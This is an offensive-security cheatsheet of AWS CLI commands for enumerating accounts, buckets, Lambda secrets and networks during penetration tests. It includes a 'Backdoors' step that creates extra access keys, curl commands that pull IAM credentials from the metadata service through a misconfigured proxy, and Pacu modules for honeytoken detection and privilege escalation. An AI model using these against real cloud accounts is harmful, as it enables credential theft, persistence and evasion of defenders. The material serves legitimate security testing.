## Amazon Web Services (AWS) CLI Tool Cheatsheet
By Beau Bullock (@dafthack)

#### Authentication

Set AWS programmatic keys for authentication (use --profile=<name> for a new profile)

```bash
aws configure
```

#### Open S3 bucket enumeration

List the contents of an S3 bucket

```bash
aws s3 ls s3://<bucketname>/ 
```

Download contents of bucket

```bash
aws s3 sync s3://bucketname s3-files-dir
```

#### Account Information

Get basic account info

```bash
aws sts get-caller-identity
```

List IAM users

```bash
aws iam list-users
```

List IAM roles

```bash
aws iam list-roles
```

List S3 buckets accessible to an account

```bash
aws s3 ls
```

#### Virtual Machines

List EC2 instances

```bash
aws ec2 describe-instances
```

#### WebApps & SQL

List WebApps

```bash
aws deploy list-applications
```

List AWS RDS (SQL)

```bash
aws rds describe-db-instances --region <region name>
```

Knowing the VPC Security Group ID you can query the firewall rules to determine connectivity potential

```bash
aws ec2 describe-security-groups --group-ids <VPC Security Group ID> --region <region>
```

#### Serverless

List Lambda Functions

```bash
aws lambda list-functions --region <region>
```

Look at environment variables set for secrets and analyze code

```bash
aws lambda get-function --function-name <lambda function>
```

#### Networking

List EC2 subnets

```bash
aws ec2 describe-subnets
```

List ec2 network interfaces

```bash
aws ec2 describe-network-interfaces
```

List DirectConnect (VPN) connections

```bash
aws directconnect describe-connections
```

#### Backdoors

List access keys for a user

```bash
aws iam list-access-keys --user-name <username>
```

Backdoor account with second set of access keys

```bash
aws iam create-access-key --user-name <username>
```

### Instance Metadata Service URL

```bash
http://169.254.169.254/latest/meta-data
```

Additional IAM creds possibly available here

```bash
http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM Role Name>
```

Can potentially hit it externally if a proxy service (like Nginx) is being hosted in AWS and misconfigured

```bash
curl --proxy vulndomain.target.com:80 http://169.254.169.254/latest/meta-data/iam/security-credentials/ && echo
```

IMDS Version 2 has some protections but these commands can be used to access it

```bash
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` 
curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
```

### Other AWS Tools

#### WeirdAAL

https://github.com/carnal0wnage/weirdAAL

Run recon against all AWS services to enumerate access for a set of keys

```python
python3 weirdAAL.py -m recon_all -t <name>
```

#### Pacu

AWS exploitation framework

https://github.com/RhinoSecurityLabs/pacu

Install Pacu

```bash
sudo apt-get install python3-pip
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu
sudo bash install.sh
```

Import AWS keys for a specific profile

```bash
import_keys <profile name>
```

Detect if keys are honey token keys

```bash
run iam__detect_honeytokens
```

Enumerate account information and permissions

```bash
run iam__enum_users_roles_policies_groups
run iam__enum_permissions
whoami
```

Check for privilege escalation 

```bash
run iam__privesc_scan
```
